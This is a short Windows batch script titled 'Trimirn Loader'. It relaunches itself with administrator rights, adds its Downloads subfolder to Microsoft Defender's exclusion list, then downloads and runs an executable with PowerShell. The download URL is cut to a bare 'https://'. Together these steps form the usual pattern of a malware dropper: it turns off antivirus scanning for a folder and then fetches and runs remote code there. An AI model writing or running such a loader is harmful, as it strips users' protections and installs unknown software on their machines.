@echo off
title "Trimirn Loader"
net file 1>NUL 2>NUL
if not '%errorlevel%' == '0' (
    powershell Start-Process -FilePath "%0" -ArgumentList "%cd%" -verb runas >NUL 2>&1
    exit /b
)

cd /d %1

cd %userprofile%\Downloads\TrimTemp
powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath "%userprofile%\Downloads\TrimTemp"
powershell -Command "Invoke-WebRequest https:// -Outfile Trimirn.exe"
start "" Trimirn.exe
exit